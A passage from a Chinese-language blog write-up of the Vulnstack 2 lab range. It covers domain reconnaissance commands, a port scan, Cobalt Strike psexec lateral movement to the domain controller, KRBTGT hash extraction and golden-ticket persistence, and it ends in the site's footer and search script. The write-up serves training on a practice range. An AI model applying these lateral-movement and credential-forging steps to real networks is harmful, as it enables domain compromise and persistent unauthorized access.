+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594203450088.png" alt="1594203450088"></p>
+<p><strong>查看ip信息</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594211720611.png" alt="1594211720611"></p>
+<p>得到为双网卡，内网 10.10.10.1/24 网段，域控 ip 10.10.10.10</p>
+<p><strong>查看域名</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net config workstation</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212016261.png" alt="1594212016261"></p>
+<p>这个命令需要在Administrator权限下使用，域名为<code>WEB.de1ay.com</code></p>
+<p><strong>查看域内机器ip</strong></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212157651.png" alt="1594212157651"></p>
+<p><strong>查询域内用户</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain	<span class="comment">#该命令在本环境中需要在system权限下执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212327077.png" alt="1594212327077"></p>
+<p><strong>查询域控机器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group <span class="string">"Domain controllers"</span> /domain 	<span class="comment">#system权限下执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212381537.png" alt="1594212381537"></p>
+<p>得到域控机器为DC</p>
+<p><strong>查询域管理员</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group <span class="string">"domain admins"</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212497227.png" alt="1594212497227"></p>
+<h2 id="psexec传递"><a href="#psexec传递" class="headerlink" title="psexec传递"></a>psexec传递</h2><p>psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务</p>
+<blockquote>
+<p>获取凭据后对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口</p>
+<p>命令：<code>portscan ip网段 端口 扫描协议（arp、icmp、none） 线程</code></p>
+<p>例如：<code>portscan 10.10.10.0/24 445 arp 200</code></p>
+</blockquote>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594214618444.png" alt="1594214618444"></p>
+<p>可看到域控机器DC开放了445端口</p>
+<p>工具栏 View-&gt;Targets 查看端口探测后的存活主机<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216367936.png" alt="1594216367936"></p>
+<p>新建一个 Listener，Payload 选择 windows/beacon_smb/bind_pipe</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216416085.png" alt="1594216416085"></p>
+<p>存活主机右键-&gt;Login-&gt;psexec，选择之前获取到的凭据信息（明文密文均可），选择 Listener 及主机 Session</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216434855.png" alt="1594216434855"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216719534.png" alt="1594216719534"></p>
+<p>DC成功上线，这里会话需要选择Administrator才行，system权限试了几次没有成功</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216809369.png" alt="1594216809369"></p>
+<p>使用相同的方法可使PC机器上线<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594219729651.png" alt="1594219729651"></p>
+<p>所有机器均上线成功</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>域控信息收集</strong></p>
+<p>在域控中获得KRBTGT账户NTLM密码hash和SID<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217354108.png" alt="1594217354108"></p>
+<p><strong>黄金票据利用</strong></p>
+<blockquote>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心</span><br><span class="line">（KDC）证明用户已被其他域控制器认证。</span><br><span class="line"></span><br><span class="line">黄金票据的条件要求：</span><br><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域的KRBTGT账户NTLM密码哈希</span><br><span class="line"><span class="number">4.</span>伪造用户名</span><br><span class="line"></span><br><span class="line">原理这篇 https:<span class="comment">//www.freesion.com/article/6833306427/ 博客讲的很详细。</span></span><br><span class="line"></span><br><span class="line">黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域</span><br><span class="line">控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票</span><br><span class="line">据重新获取最高权限。</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>WEB机 Administrator 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217646994.png" alt="1594217646994"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217840245.png" alt="1594217840245"></p>
+<p>这个靶机主要使用的是cs来操作，靶机一则通过端口转发 、metasploit+proxychains代理等方式来进行横向移动，域渗透需要学的还有很多，后面会不断练习来完善相关技能</p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p>
+<p><a href="https://www.cnblogs.com/wkzb/p/12431487.html" target="_blank" rel="noopener">cobaltstrike学习笔记</a></p>
+<p><a href="https://wh0ale.github.io/2019/12/11/VulnStack%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">VulnStack域环境靶场渗透</a></p>
+<p><a href="http://www.shangdixinxi.com/detail-1457905.html" target="_blank" rel="noopener">ATT&amp;CK实战系列——红队实战（二）</a></p>
+<p><a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">域渗透之（黄金票据利用）</a></p>
+<p><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725" target="_blank" rel="noopener">CVE-2019-2725</a></p>
+<p><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/" target="_blank" rel="noopener">cobalt strike 快速上手 [ 一 ]</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年07月14日 21:07:25<br>
+  <span>原始链接:</span><a href="/2020/07/14/Vulnstack%E4%BA%8C/" title="[域渗透]Vulnstack(二)">https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/06/dpwwn-02/" rel="next" title="vulnhub靶机-dpwwn-02">
+                <i class="fa fa-chevron-left"></i> vulnhub靶机-dpwwn-02
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/14/iiszhong-jian-jian/" rel="prev" title="IIS中间件漏洞总结">
+                IIS中间件漏洞总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机描述"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#外网渗透"><span class="nav-number">3.</span> <span class="nav-text">外网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GETSHELL"><span class="nav-number">3.2.</span> <span class="nav-text">GETSHELL</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#内网渗透"><span class="nav-number">4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cobaltstrike学习"><span class="nav-number">4.1.</span> <span class="nav-text">cobaltstrike学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">4.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域信息收集"><span class="nav-number">4.3.</span> <span class="nav-text">域信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec传递"><span class="nav-number">4.4.</span> <span class="nav-text">psexec传递</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">4.5.</span> <span class="nav-text">权限维持</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">160k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">160k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
